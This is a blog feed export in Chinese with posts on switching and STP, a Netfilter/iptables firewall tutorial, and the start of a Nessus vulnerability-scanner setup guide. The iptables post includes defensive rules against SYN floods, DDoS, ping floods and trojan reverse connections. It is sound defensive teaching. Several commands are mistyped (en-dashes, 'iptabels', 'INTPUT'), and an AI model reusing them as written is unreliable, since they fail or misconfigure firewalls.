交换技术</h2><p><em>交换技术是用来将大的冲突域分隔为小的冲突域(使用两个或多个设别对网络进行分段所形成的可共享同一带宽的区域)</em></p><p><em>路由选择协议可以防止在网络层形成网络环路，然后，对于因交换机之间存在冗余物理链路而在数据链路层上形成的环路，需要生成树协议解决</em></p><h3 id="1-交换技术发展"><a href="#1-交换技术发展" class="headerlink" title="1. 交换技术发展"></a>1. 交换技术发展</h3><p><strong>(1) 第二层交换发展</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/BGP.png" alt=""></p><p><em>折叠式骨干结构，所有的主机都只有连接到公司的骨干网才能获得所需的网络服务；随着骨干网络的不断增长，网络服务变得缓慢</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E4%BA%A4%E6%8D%A2%E5%BC%8F%E7%BD%91%E7%BB%9C.png" alt=""></p><p><em>网桥首先被用于网络中冲突域的分隔，但网桥端口数量有限；直到交换机的出现，从根本上解决问题</em></p><p><em>每台集线器都被连接到一个交换机端口上，使其拥有了独立的属于自身的冲突域</em></p><p><strong>(2) 交换式服务</strong></p><p><em>第二层交换机和网桥只是在决定转发，泛洪或是求其数据帧之前查看帧的硬件地址，没有对数据包进行修改，交换过程快捷且不易出错</em></p><p><em>与集线器不同，交换机能够创建私有的，专用的冲突域，并且能够在每个端口上提供独立的带宽</em></p><p><em>桥接网络能够将冲突与进行分隔，但默认情况下，第二层的交换机和网桥不能对广播域进行分隔，限制了网络的规模和性能，因此需要路由器</em></p><p><strong><em>A. 桥接/局域网交换比较</em></strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%AF%B9%E6%AF%94.png" alt=""></p><p><strong><em>B. 第二层上的三种交换功能</em></strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E4%BA%A4%E6%8D%A2%E5%8A%9F%E8%83%BD.png" alt=""></p><h3 id="2-STP-协议"><a href="#2-STP-协议" class="headerlink" title="2. STP 协议"></a>2. STP 协议</h3><p><strong>(1) 协议概况</strong></p><p><em>生成树协议（英语：Spanning Tree Protocol，STP），是一种工作在OSI网络模型中的第二层(数据链路层)的通信协议，基本应用是防止交换机冗余链路产生的环路.用于确保以太网中无环路的逻辑拓扑结构.从而避免了广播风暴,大量占用交换机的资源</em></p><p><strong>(2) 工作原理</strong></p><p><em>生成树协议工作原理:任意一交换机中如果到达根网桥有两条或者两条以上的链路.生成树协议都根据算法把其中一条切断,仅保留一条.从而保证任意两个交换机之间只有一条单一的活动链路</em></p><p><strong>(3) 工作过程</strong></p><p><em>首先进行根网桥的选举，其依据是网桥优先级（bridge priority）和MAC地址组合生成的桥ID，桥ID最小的网桥将成为网络中的根桥（bridge root）。在此基础上，计算每个节点到根桥的距离，并由这些路径得到各冗余链路的代价，选择最小的成为通信路径（相应的端口状态变为forwarding），其它的就成为备份路径(相应的端口状态变为blocking)。STP生成过程中的通信任务由BPDU完成，这种数据包又分为包含配置信息的配置BPDU（其大小不超过35B）和包含拓扑变化信息的通知BPDU（其长度不超过4B）</em></p><p><em>参考链接：</em><a href="https://www.qingsword.com/qing/636.html" target="_blank" rel="noopener">https://www.qingsword.com/qing/636.html</a></p><hr><h2 id="0x04-虚拟局域网"><a href="#0x04-虚拟局域网" class="headerlink" title="0x04 虚拟局域网"></a>0x04 虚拟局域网</h2><p><em>参考链接：</em><a href="https://zhuanlan.zhihu.com/p/35616289" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35616289</a></p><hr><h2 id="0x05-访问控制列表"><a href="#0x05-访问控制列表" class="headerlink" title="0x05 访问控制列表"></a>0x05 访问控制列表</h2><p><em>参考链接：</em></p><ul><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/security/ios-firewall/23602-confaccesslists.html" target="_blank" rel="noopener">Cisco-配置IP访问列表</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/35530328" target="_blank" rel="noopener">知乎专栏-ACL技术详解</a></p></li></ul><hr><h2 id="0x06-网络地址转换"><a href="#0x06-网络地址转换" class="headerlink" title="0x06 网络地址转换"></a>0x06 网络地址转换</h2><p><em>参考链接：</em></p><ul><li><a href="https://zhuanlan.zhihu.com/p/26992935" target="_blank" rel="noopener">知乎专栏-NAT技术详解</a></li></ul><ul><li><a href="https://www.cisco.com/c/zh_cn/support/docs/ip/network-address-translation-nat/13772-12.html" target="_blank" rel="noopener">Cisco-配置网络地址转换</a></li></ul><hr><h2 id="0x07-DHCP及配置"><a href="#0x07-DHCP及配置" class="headerlink" title="0x07 DHCP及配置"></a>0x07 DHCP及配置</h2><p><em>参考链接：</em><a href="https://www.cisco.com/c/zh_cn/support/docs/ip/dynamic-address-allocation-resolution/22920-dhcp-ser.html" target="_blank" rel="noopener">Cisco-动态配置 DHCP 服务器选项</a></p><hr><h2 id="0x08-广域网技术"><a href="#0x08-广域网技术" class="headerlink" title="0x08 广域网技术"></a>0x08 广域网技术</h2><p>参考链接：</p><ul><li><p><a href="https://www.cisco.com/c/dam/global/zh_cn/solutions/industry/segment_sol/enterprise/programs_for_large_enterprise/iba/pdf/c07-610746-02_wandeploy.pdf" target="_blank" rel="noopener">Cisco-广域网部署指南</a></p></li><li><p><a href="http://www.voidcn.com/article/p-wwmcbrna-dw.html" target="_blank" rel="noopener">程序园-PPP协议详解</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/tech/wan/point-to-point-protocol-ppp/tech-configuration-examples-list.html" target="_blank" rel="noopener">Cisco-PPP协议配置文档</a></p></li></ul><hr><h2 id="0x09-Packet-Tracer"><a href="#0x09-Packet-Tracer" class="headerlink" title="0x09 Packet Tracer"></a>0x09 Packet Tracer</h2><p><em>参考链接：</em><a href="https://www.netacad.com/zh-hans/courses/packet-tracer" target="_blank" rel="noopener">Cisco-Packet Tracer</a></p><hr><h2 id="0x0A-组网实例"><a href="#0x0A-组网实例" class="headerlink" title="0x0A 组网实例"></a>0x0A 组网实例</h2><ul><li><p><a href="https://zhuanlan.zhihu.com/p/24387774" target="_blank" rel="noopener">知乎专栏-家庭网络规划及布线</a></p></li><li><p><a href="http://www.voidcn.com/article/p-obfqjzbq-sz.html" target="_blank" rel="noopener">程序园-企业组网综合案例</a></p></li></ul><hr><h2 id="0xFF-学习资源"><a href="#0xFF-学习资源" class="headerlink" title="0xFF 学习资源"></a>0xFF 学习资源</h2><ul><li><p><a href="http://www.52im.net/topic-tcpipvol1.html?mobile=no" target="_blank" rel="noopener">TCP/IP 详解卷1：协议</a></p></li><li><p><a href="https://pan.baidu.com/s/1-G9Vire50weqhS0anO-WwQ" target="_blank" rel="noopener">图解TCP/IP 第五版</a></p></li><li><p><a href="https://pan.baidu.com/s/1CRWJpr7OlK1ImrYu6uRlPw" target="_blank" rel="noopener">CCNA 学习指南第七版</a></p></li><li><p><a href="https://pan.baidu.com/s/1NJV9-6An5fgmZeHzHgmNoA" target="_blank" rel="noopener">CCNA 学习指南(ICND1)</a></p></li><li><p><a href="https://pan.baidu.com/s/1LPbWMEku7FIxG9iVmWk1ng" target="_blank" rel="noopener">CCNA 学习指南(ICND2)</a></p></li><li><p><a href="https://pan.baidu.com/s/1_RYcec-4loANcIa9Dv51cw" target="_blank" rel="noopener">CCNP SWITCH 学习指南</a></p></li><li><p><a href="https://pan.baidu.com/s/1AHCw_mHYVnt4GUJzn6RTEg" target="_blank" rel="noopener">CCNP ROUTE 学习指南</a></p></li><li><p><a href="https://pan.baidu.com/s/1vny1Ikv28dJ0UwfL_m2wTg" target="_blank" rel="noopener">CCNP 实验指南</a></p></li><li><p><a href="https://pan.baidu.com/s/1xx1O6gxMycp1jxVMOySpGw" target="_blank" rel="noopener">CCIE 认证考试指南</a></p></li><li><p><a href="https://pan.baidu.com/s/1-bKjuwihSmxEP8zWpTGuhA" target="_blank" rel="noopener">CCIE 路由交换实验指南</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文对网络协议，路由交换，组网等技术进行分析，涉及RIP，OSPF，EIGR等路由协议，VLAN，STP，ACL，NAT，DHCP，PPP等网络技术，以及 Cisco ISO 与 Cisco Packet Tracer 的基本命令及用法&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="网络协议" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
    
      <category term="Network" scheme="http://www.firehacker.top/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>防火墙之Netfilter浅析</title>
    <link href="http://www.firehacker.top/2018/10/02/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%8BNetfilter%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/10/02/防火墙之Netfilter浅析/</id>
    <published>2018-10-02T10:03:57.000Z</published>
    <updated>2018-10-24T06:59:16.826Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.netfilter.org/index.html" target="_blank" rel="noopener">Netfilter</a> 是Linux内核的包过滤框架，它提供了一系列的钩子（Hook）供其他模块控制包的流动；iptables是一个配置Linux内核防火墙的命令行工具，它基于内核的netfilter机制；本文对 Netfilter 基本原理及 Iptables 用法进行简要总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-Netfiter-Iptables-简介"><a href="#0x01-Netfiter-Iptables-简介" class="headerlink" title="0x01 Netfiter/Iptables 简介"></a>0x01 Netfiter/Iptables 简介</h2><h3 id="1-Netfilter-概况"><a href="#1-Netfilter-概况" class="headerlink" title="1. Netfilter 概况"></a>1. Netfilter 概况</h3><pre><code>1. Netfilter是Linux内核提供的框架，允许以自定义处理程序的形式实现各种与网络相关的操作2. Netfilter为包过滤，网络地址转换和端口转换提供各种功能和操作，它们提供通过网络引导数据包所需的功能，以及提供禁止数据包到达计算机网络内敏感位置的能力3. Netfilter代表Linux内核中的一组钩子，允许特定的内核模块在内核的网络堆栈中注册回调函数。通常以过滤和修改规则的形式应用于流量的那些功能被调用用于遍历网络堆栈内的相应钩子的每个分组</code></pre><h3 id="2-Netfilter-Components"><a href="#2-Netfilter-Components" class="headerlink" title="2. Netfilter Components"></a>2. Netfilter Components</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/Netfilter-components.png" alt=""></p><h3 id="3-Packet-flow-in-Netfilter"><a href="#3-Packet-flow-in-Netfilter" class="headerlink" title="3. Packet flow in Netfilter"></a>3. Packet flow in Netfilter</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/Netfilter-packet-flow.png" alt=""></p><h3 id="4-Iptables-概况"><a href="#4-Iptables-概况" class="headerlink" title="4. Iptables 概况"></a>4. Iptables 概况</h3><pre><code>1. iptables是运行在用户空间的应用软件，通过控制Linux内核netfilter模块，来管理网络数据包的流动与转送2. 通常iptables都需要内核层级的模块来配合运作，Xtables是主要在内核层级里面iptables API运作功能的模块3. 目前iptables在2.4、2.6及3.0版本的内核下运作，旧版的Linux内核（2.2）使用ipchains及ipwadm（Linux 2.0）达成类似的功能，2014年1月19日起发行的新版Linux内核（3.13后）则使用nftables取而代之</code></pre><h3 id="5-Nftables-简介"><a href="#5-Nftables-简介" class="headerlink" title="5. Nftables 简介"></a>5. Nftables 简介</h3><pre><code>1. nftables旨在取代Netfilter，作为新的通用内核数据包分类引擎2. nftables内核引擎将一个简单的虚拟机添加到Linux内核中，该内核能够执行字节码来检查网络数据包并决定应该如何处理该数据包3. 该虚拟机实现的操作有意为基本操作：它可以从数据包本身获取数据，查看关联的元数据（例如，入站接口），以及管理连接跟踪数据。算术，按位和比较运算符可用于根据该数据做出决策。虚拟机还能够处理数据集（通常是IP地址），允许使用单集查找替换多个比较操作4. 与Netfilter代码形成对比，Netfilter代码具有如此深深地嵌入到代码中的协议感知，它必须被复制四次 - 用于IPv4，IPv6，ARP和以太网桥接 - 因为防火墙引擎过于特定于协议以通用方式使用；iptables是简化Linux内核ABI，减少代码重复，改进错误报告，以及更有效的执行，存储和过滤规则的增量更改</code></pre><hr><h2 id="0x02-Iptables-结构"><a href="#0x02-Iptables-结构" class="headerlink" title="0x02 Iptables 结构"></a>0x02 Iptables 结构</h2><pre><code>iptables -&gt; Tables -&gt; Chains -&gt; Rules</code></pre><p><em>Tables由chains组成，而chains又由rules组成。iptables 默认有四个表Filter, NAT, Mangle, Raw</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/Iptables.png" alt=""></p><pre><code>1. iptable_filter module：注册过滤表，用于通用过滤（防火墙）2. iptable_nat module：注册两个挂钩：基于目标网络地址转换的转换（“DNAT”）在过滤器挂钩之前应用，之后应用基于源网络地址转换的转换（“SNAT”）。可用于iptables 的网络地址转换表（或“nat”）仅仅是用于NAT映射的“配置数据库” ，并不用于任何类型的过滤3. iptable_mangle module：注册一个hook和mangle表，在Connection Tracking（见下文）之后运行（但仍然在任何其他表之前），以便可以对数据包进行修改4. iptable_raw module：加载时，注册一个将在任何其他Netfilter挂钩之前调用的挂钩。它提供了一个名为raw的表，可用于在数据包达到更多内存要求较高的操作（如连接跟踪）之前对其进行过滤5. security_filter module：用于强制访问控制（MAC）网络规则，例如由SECMARK和CONNSECMARK目标启用的规则。强制访问控制由Linux安全模块（如SELinux）实现</code></pre><hr><h2 id="0x03-Filter-表详解"><a href="#0x03-Filter-表详解" class="headerlink" title="0x03 Filter 表详解"></a>0x03 Filter 表详解</h2><h3 id="1-filter-规则链"><a href="#1-filter-规则链" class="headerlink" title="1. filter 规则链"></a>1. filter 规则链</h3><pre><code>1. INPUT - 所有以主机为目的地的封包，处理来自外部的数据2. OUTPUT - 所有源自主机的封包，处理向外发送的数据3. FORWARD - 这些封包的目的地或来源地都不是主机，但路经主机（由它选路），将数据转发到本机的其他网卡设备上</code></pre><h3 id="2-数据流向场景"><a href="#2-数据流向场景" class="headerlink" title="2. 数据流向场景"></a>2. 数据流向场景</h3><ul><li><p>访问本机：在INPUT链上做过滤</p></li><li><p>本机访问外部：在OUTPUT链上做过滤</p></li><li><p>通过本机访问其他主机:在FORWARD链上做过滤</p></li></ul><h3 id="3-Iptables-基本操作"><a href="#3-Iptables-基本操作" class="headerlink" title="3. Iptables 基本操作"></a>3. Iptables 基本操作</h3><pre><code>1. 启动iptables：service iptables start2. 关闭iptables：service iptables stop3. 重启iptables：service iptables restart4. 查看iptables状态：service iptables status5. 保存iptables配置：service iptables save6. Iptables服务配置文件：/etc/sysconfig/iptables-config7. Iptables规则保存文件：/etc/sysconfig/iptables8. 打开iptables转发：echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward</code></pre><hr><h2 id="0x04-Iptables-命令参考"><a href="#0x04-Iptables-命令参考" class="headerlink" title="0x04 Iptables 命令参考"></a>0x04 Iptables 命令参考</h2><pre><code>iptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转] </code></pre><h3 id="1-表名"><a href="#1-表名" class="headerlink" title="1. 表名"></a>1. 表名</h3><p><em>表名：</em><code>Filter, NAT, Mangle, Raw</code></p><p><em>起包过滤功能的为表Filter，可以不填，不填默认为Filte</em></p><h3 id="2-命令选项"><a href="#2-命令选项" class="headerlink" title="2. 命令选项"></a>2. 命令选项</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E9%80%89%E9%A1%B9.png" alt=""></p><h3 id="3-链名"><a href="#3-链名" class="headerlink" title="3. 链名"></a>3. 链名</h3><p><em>根据数据流向来确定具体使用哪个链，在Filter中的使用情况如下</em></p><pre><code>1. INPUT链 – 处理来自外部的数据2. OUTPUT链 – 处理向外发送的数据3. FORWARD链 – 将数据转发到本机的其他网卡设备上</code></pre><h3 id="4-条件匹配"><a href="#4-条件匹配" class="headerlink" title="4. 条件匹配"></a>4. 条件匹配</h3><p><em>条件匹配分为基本匹配和扩展匹配，拓展匹配又分为隐式扩展和显式扩展</em></p><p><strong>(1) 基本匹配</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%9F%BA%E6%9C%AC%E5%8C%B9%E9%85%8D.png" alt=""></p><p><strong>(2) 隐式扩展</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E9%9A%90%E5%BC%8F%E6%89%A9%E5%B1%95.png" alt=""></p><p><strong>(3) 显式扩展</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E6%98%BE%E7%A4%BA%E6%89%A9%E5%B1%95.png" alt=""></p><h3 id="5-目标值"><a href="#5-目标值" class="headerlink" title="5. 目标值"></a>5. 目标值</h3><pre><code>1. ACCEPT：允许数据包通过2. DROP：直接丢弃数据包，不给出任何回应信息3. REJECT：拒绝数据包通过，必须时会给数据发送端一个响应信息4. LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则5. QUEUE：防火墙将数据包移交到用户空间 6. RETURN：防火墙停止执行当前链中的后续Rules，并返回到调用链(the calling chain) </code></pre><hr><h2 id="0x05-Iptables-命令实例"><a href="#0x05-Iptables-命令实例" class="headerlink" title="0x05 Iptables 命令实例"></a>0x05 Iptables 命令实例</h2><p><strong><em>(1) 删除 iptables 现有规则</em></strong></p><pre><code>iptables –F</code></pre><p><strong><em>(2) 查看 iPtables 规则</em></strong></p><pre><code>iptables –L（iptables –L –v -n）</code></pre><p><strong><em>(3) 增加一条规则到最后</em></strong></p><pre><code>iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT</code></pre><p><strong><em>(4) 添加一条规则到指定位置</em></strong></p><pre><code>iptables -I INPUT 2 -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT </code></pre><p><strong><em>(5) 删除一条规则</em></strong></p><pre><code>iptabels -D INPUT 2</code></pre><p><strong><em>(6) 修改一条规则</em></strong></p><pre><code>iptables -R INPUT 3 -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT </code></pre><p><strong><em>(7) 设置默认策略</em></strong></p><pre><code>iptables -P INPUT DROP </code></pre><p><strong><em>(8) 允许远程主机进行SSH连接</em></strong></p><pre><code>iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT </code></pre><p><strong><em>(9) 允许本地主机进行SSH连接</em></strong></p><pre><code>iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT iptables -A INTPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</code></pre><p><strong><em>(10) 允许 HTTP 请求</em></strong></p><pre><code>iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</code></pre><p><strong>(11) 限制ping 192.168.0.1主机的数据包数，平均2/s个，最多不能超过3个</strong></p><pre><code>iptables -A INPUT -i eth0 -d 192.168.0.1 -p icmp --icmp-type 8 -m limit --limit 2/second --limit-burst 3 -j ACCEPT</code></pre><p><strong><em>(12) 限制SSH连接速率(默认策略是DROP)</em></strong></p><pre><code>iptables -I INPUT 1 -p tcp --dport 22 -d 192.168.146.3 -m state --state ESTABLISHED -j ACCEPT  iptables -I INPUT 2 -p tcp --dport 22 -d 192.168.146.3 -m limit --limit 2/minute --limit-burst 2 -m state --state NEW -j ACCEPT</code></pre><hr><h2 id="0x07-正确配置-iptables"><a href="#0x07-正确配置-iptables" class="headerlink" title="0x07 正确配置 iptables"></a>0x07 正确配置 iptables</h2><p><strong><em>(1) 删除现有规则</em></strong></p><pre><code>iptables -F</code></pre><p><strong><em>(2) 配置默认链策略</em></strong></p><pre><code>iptables -P INPUT DROP iptables -P FORWARD DROP iptables -P OUTPUT DROP </code></pre><p><strong><em>(3) 允许远程主机进行SSH连接</em></strong></p><pre><code>iptables -A INPUT -i eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT</code></pre><p><strong><em>(4) 允许本地主机进行SSH连接</em></strong></p><pre><code>iptables -A OUTPUT -o eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A INPUT -i eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT </code></pre><p><strong><em>(5) 允许HTTP请求</em></strong></p><pre><code>iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT</code></pre><hr><h2 id="0x08-Iptables-抵抗攻击"><a href="#0x08-Iptables-抵抗攻击" class="headerlink" title="0x08 Iptables 抵抗攻击"></a>0x08 Iptables 抵抗攻击</h2><h3 id="1-防止-SYN-攻击"><a href="#1-防止-SYN-攻击" class="headerlink" title="1. 防止 SYN 攻击"></a>1. 防止 SYN 攻击</h3><p><strong><em>(1) 限制syn的请求速度（需要调节一个合理的速度值）</em></strong></p><pre><code>iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN iptables -A syn-flood -j DROP </code></pre><p><strong><em>(2) 限制单个ip的最大syn连接数</em></strong></p><pre><code>iptables –A INPUT –i eth0 –p tcp --syn -m connlimit --connlimit-above 15 -j DROP</code></pre><h3 id="2-防止-DDOS-攻击"><a href="#2-防止-DDOS-攻击" class="headerlink" title="2. 防止 DDOS 攻击"></a>2. 防止 DDOS 攻击</h3><p><strong><em>(1) 利用recent模块抵御DOS攻击</em></strong></p><p><strong><em>(2) 单个IP最多连接3个会话</em></strong></p><pre><code>iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP</code></pre><p><strong><em>(3) 新的连接请求，加入到SSH列表中</em></strong></p><pre><code>iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH</code></pre><p><strong><em>(4) 限制 IP 访问次数</em></strong></p><pre><code>Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP</code></pre><p><em>当5分钟访问次数达到3次，就拒绝提供SSH列表中的这个IP服务，被限制5分钟后即可恢复访问</em></p><h3 id="3-防止单个ip访问量过大"><a href="#3-防止单个ip访问量过大" class="headerlink" title="3. 防止单个ip访问量过大"></a>3. 防止单个ip访问量过大</h3><pre><code>iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP</code></pre><h3 id="4-木马反弹"><a href="#4-木马反弹" class="headerlink" title="4. 木马反弹"></a>4. 木马反弹</h3><pre><code>iptables –A OUTPUT –m state --state NEW –j DROP</code></pre><h3 id="5-防止ping攻击"><a href="#5-防止ping攻击" class="headerlink" title="5. 防止ping攻击"></a>5. 防止ping攻击</h3><pre><code>iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT </code></pre><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html" target="_blank" rel="noopener">Iptables Tutorial 1.2.2</a></p></li><li><p><a href="https://netfilter.org/documentation/" target="_blank" rel="noopener">Netfilter - documentation</a></p></li><li><p><a href="https://zh.wikipedia.org/wiki/Iptables" target="_blank" rel="noopener">Wikipedia - Iptables</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Netfilter" target="_blank" rel="noopener">Wikipedia - Netfilter</a></p></li><li><p><a href="https://wiki.centos.org/zh/HowTos/Network/IPTables" target="_blank" rel="noopener">IPTables - Centos Wiki</a></p></li><li><p><a href="https://help.ubuntu.com/community/IptablesHowTo" target="_blank" rel="noopener">Iptables - Ubuntu Documentation</a></p></li><li><p><a href="http://drops.mayter.cn/#!/drops/226.Iptables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B" target="_blank" rel="noopener">Iptables 入门教程 - Wooyun Drops</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.netfilter.org/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Netfilter&lt;/a&gt; 是Linux内核的包过滤框架，它提供了一系列的钩子（Hook）供其他模块控制包的流动；iptables是一个配置Linux内核防火墙的命令行工具，它基于内核的netfilter机制；本文对 Netfilter 基本原理及 Iptables 用法进行简要总结&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全产品" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
    
    
      <category term="SecTools" scheme="http://www.firehacker.top/tags/SecTools/"/>
    
      <category term="SecProducts" scheme="http://www.firehacker.top/tags/SecProducts/"/>
    
      <category term="Netfilter" scheme="http://www.firehacker.top/tags/Netfilter/"/>
    
      <category term="Iptables" scheme="http://www.firehacker.top/tags/Iptables/"/>
    
  </entry>
  
  <entry>
    <title>漏洞扫描之Nessus详解</title>
    <link href="http://www.firehacker.top/2018/10/02/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B9%8BNessus%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.firehacker.top/2018/10/02/漏洞扫描之Nessus详解/</id>
    <published>2018-10-02T03:19:42.000Z</published>
    <updated>2018-10-24T06:58:12.771Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.tenable.com/products/nessus/nessus-professional" target="_blank" rel="noopener">Nessus</a> 是一款优秀的系统漏洞扫描与分析软件，提供完整的漏洞扫描服务,，并随时更新其漏洞数据库，可同时在本机或远端上摇控, 进行系统的漏洞分析扫描；本文对其扫描原理，基本用法，及高阶功能进行总结分析</p></blockquote><a id="more"></a><hr><h2 id="0x01-安装配置"><a href="#0x01-安装配置" class="headerlink" title="0x01 安装配置"></a>0x01 安装配置</h2><p><strong>(1) 下载</strong></p><p><em>链接：</em><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a></p><p><strong>(2) 安装</strong></p><pre><code>dpkg -i Nessus-7.1.3-debian6_amd64.deb</code></pre><p><strong>(3) 启动 Nessus</strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/nessus.png" alt=""></p><p><strong>(4) 配置 Nessus</strong></p><p><strong><em>A. 获取nessus激活码</em></strong></p><p><em>链接：</em><a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/activation-code</a></p><p><strong><em>B. 激活 nessus</em></strong></p><p><em>默认监听地址：</em><a href="https://127.0.0.1:8834" target="_blank" rel="noopener">https://127.0.0.1:8834</a></p><p><em>访问该网址，创建账号，进行激活，下载规则库，登录主界面</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt=""></p><p><em>参考链接：</em></p><ul><li><p><a href="https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm" target="_blank" rel="noopener">https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm</a></p></li><li><p><a href="https://www.cnblogs.com/lsdb/p/9003692.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsdb/p/9003692.html</a></p></li></ul><hr><h2 id="0x02-基本用法"><a href="#0x02-基本用法" class="headerlink" title="0x02 基本用法"></a>0x02 基本用法</h2><h3 id="1-添加策略"><a href="#1-添加策略" class="headerlink" title="1. 添加策略"></a>1. 添加策略</h3><pre><code>1. 登录 nessus：https://127.0.0.1:8834/2. 切换至 policies 选项，右上角单击 New Policy，选择 Advanced Policy 类型3. 在该界面设置策略名、可见性和描述信息（可选项）4. 单击 Plugins 标签，该界面显示了所有插件程序，默认全部是启动的；在该界面可以单击 Disable All按钮，禁用所有启动的插件程序。然后指定需要启动的插件程序5. 在该界面单击Save按钮，完成策略创建</code></pre><p><img src="http://pcdbq4c2i.bkt.clouddn.com/poli.png" alt=""></p><h3 id="2-创建扫描任务"><a href="#2-创建扫描任务" class="headerlink" title="2. 创建扫描任务"></a>2. 创建扫描任务</h3><pre><code>1. 鼠标切换至 My Scans 选项卡，右上角单击 New Scan2. 在该界面设置扫描任务名称、使用策略、文件夹和扫描的目标，然后单击Launch按钮3. 从该界面可以看到扫描任务的状态为Running（正在运行）；如果想要停止扫描，可以单击 停止按钮</code></pre><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E5%88%9B%E5%BB%BA.png" alt=""></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E6%BC%8F%E6%B4%9E.png" alt=""></p><hr><h2 id="0x03-扫描实战"><a href="#0x03-扫描实战" class="headerlink" title="0x03 扫描实战"></a>0x03 扫描实战</h2><h3 id="1-扫描本地漏洞"><a href="#1-扫描本地漏洞" class="headerlink" title="1. 扫描本地漏洞"></a>1. 扫描本地漏洞</h3><p><strong><em>(1) 新建名为Local Vulnerability Assessment策略</em></strong></p><p><strong><em>(2) 添加所需的插件程序</em></strong></p><ul><li><p>Ubuntu Local Security Checks：扫描本地Ubuntu安全检查</p></li><li><p>Default Unix Accounts：扫描默认Unix账户</p></li></ul><p><strong><em>(3) 新建名为Sample Scan扫描任务</em></strong></p><p><strong><em>(4) 